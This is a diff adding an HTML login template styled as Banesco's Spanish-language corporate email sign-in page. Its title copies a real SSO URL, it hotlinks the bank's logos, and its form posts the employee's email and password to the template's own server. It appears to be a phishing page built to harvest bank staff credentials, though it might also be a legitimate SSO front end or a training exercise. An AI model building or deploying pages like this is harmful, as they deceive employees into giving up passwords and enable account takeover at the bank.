@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>https://banesco-sso.appspot.com/Index.jsp?domain=banescoseguros.com&SAMLRequest=fVLLTuswEN1fiX%2BwvM%2BjAcSV1QQVEKISj4gGFuwcZ5K4dTzB47Tw9zdNQXAXsD0%2Bcx7jmZ%2B%2FdYZtwZFGm%2FJZGHMGVmGlbZPyp%2BI6%2BMvPs6M%2Fc5Kd6cVi8K19hNcByLNx0pKYHlI%2BOCtQkiZhZQckvBKrxd2tSMJY9A49KjScLa9SvtZtqzdl22%2BMKdcVtqqvurarsIFmrWwNZd8063rD2fNnrGQfa0k0wNKSl9aPUJycBPFZkJwWs2MRJyJJXjjLP5wutD00%2BC1WeSCRuCmKPMgfVsUksNUVuPuRnfIGsTEQKuz29rkk0tsRrqUh4GxBBM6PAS%2FR0tCBW4HbagVPj7cpb73vSUTRbrcLv2QiGZXSAikkaAaHdAAV8WzasJhKum%2Br%2Fb2C%2FIzAsy%2BTefRNKvv4uX2h5VWORqt3tjAGd5cOpB%2FbeDeMZa7RddL%2F7DYLZxOiq6CeqGKw1IPStYaKsyg7uP5%2FIuPh%2FAM%3D&RelayState=https%3A%2F%2Fwww.google.com%2Fa%2Fbanescoseguros.com%2FServiceLogin%3Fservice%3Dmail%26passive%3Dtrue%26rm%3Dfalse%26continue%3Dhttps%253A%252F%252Fmail.google.com%252Fmail%252F%26ss%3D1%26ltmpl%3Ddefault%26ltmplcache%3D2%26emr%3D1%26osid%3D1</title>
+    <link rel="shortcut icon" href="{{ url_for('static', filename='favicon.ico') }}" type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    <div id="wrapper">
+        <div id="logos">
+            <p style="color: #333333"><b>Bienvenido al correo corporativo de Banesco</b></p>
+            <img src="https://esc-files.appspot.com/files/mimefile/BanescoNuevo/pantalla-login-logos.png" alt="Banesco Logo">
+        </div>
+        <span class="ping">
+            <img src="https://esc-files.appspot.com/files/mimefile/BanescoNuevo/pantalla-login-ping.png" alt="Ping">
+        </span>
+        <span class="logo-banesco">
+            <img src="https://esc-files.appspot.com/files/mimefile/BanescoNuevo/pantalla-login-logo2.png" alt="Banesco Logo">
+        </span>
+        <div id="form-login">
+            <span class="error">
+                {% if error_message %}
+                <ul>
+                    <li>{{ error_message }}</li>
+                </ul>
+                {% else %}
+                <ul></ul>
+                {% endif %}
+            </span>
+            <form name="authForm" action="/" method="post" autocomplete="off">
+                <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
+                {% if user_id %}
+                    <input type="hidden" name="user_id" value="{{ user_id }}"/>
+                {% endif %}
+                <span>Correo electrónico:</span>
+                <input type="email" name="account" size="50" placeholder="Correo electrónico corporativo" required>
+                <span>Contraseña:</span>
+                <input type="password" name="password" size="50" placeholder="Contraseña" required>
+                <input class="button-iniciar" type="submit" value="Iniciar Sesión">
+                <input class="button-cancelar" type="button" value="Cancelar" onclick="javascript:close_window()">
+            </form>
+            <p class="atencion">En caso de dudas, contacta a <b>Service Desk</b></p>
+        </div>
+        <div id="shadow"></div>
+        <div id="banderas">
+            <img src="https://esc-files.appspot.com/files/mimefile/BanescoNuevo/pantalla-login-banderas.png" alt="Banderas">
+        </div>
+    </div>
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
